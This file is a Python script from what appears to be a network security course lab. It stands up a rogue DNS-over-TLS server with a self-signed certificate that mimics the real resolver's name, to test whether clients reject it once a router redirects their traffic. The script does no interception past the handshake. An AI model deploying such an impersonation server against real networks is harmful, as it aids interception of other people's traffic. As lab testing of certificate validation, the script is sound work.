#!/usr/bin/env python3
"""
Phase 7 attack (ii) -- impersonate the resolver with a rogue certificate.

Listens on 172.16.1.100:853 (this container's own address, on the
client subnet). Only ever reached when edge-router's DNAT rule
(`set-attack.sh roguecert`) redirects client->172.16.2.10:853 here
instead of to the real resolver. Presents rogue-cert/rogue.crt -- the
SAME CN/SAN (resolver.cs6008.local) as the real certificate, but
self-signed and NOT issued by the CA either client trusts (see
make-pki.sh). Both clients' TLS stacks are expected to reject this
during the handshake, before any DNS query is ever read off the wire --
this script barely needs to do anything past accept() + wrap_socket()
to demonstrate that.
"""
import socket
import ssl

LISTEN = ("172.16.1.100", 853)
CERT = "/opt/attacker/rogue-cert/rogue.crt"
KEY = "/opt/attacker/rogue-cert/rogue.key"


def main():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=CERT, keyfile=KEY)

    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw.bind(LISTEN)
    raw.listen(5)
    print(f"[rogue-tls] listening on {LISTEN} with an UNTRUSTED cert for "
          f"resolver.cs6008.local -- waiting for a client edge-router's "
          f"DNAT rule has redirected here", flush=True)
    while True:
        conn, addr = raw.accept()
        print(f"[rogue-tls] TCP connect from {addr}, attempting TLS handshake...",
              flush=True)
        try:
            tls_conn = ctx.wrap_socket(conn, server_side=True)
            # If we ever get here, the far end accepted our rogue cert --
            # that would be the actual compromise. We don't bother
            # forging a DNS answer on top of it; getting an
            # unauthenticated client to reach this point at all is
            # already the finding.
            print(f"[rogue-tls] !! TLS handshake with {addr} COMPLETED -- "
                  f"client accepted an untrusted certificate", flush=True)
            tls_conn.close()
        except ssl.SSLError as e:
            print(f"[rogue-tls] handshake with {addr} failed as expected: {e}",
                  flush=True)
        except Exception as e:
            print(f"[rogue-tls] connection from {addr} ended: {e}", flush=True)


if __name__ == "__main__":
    main()
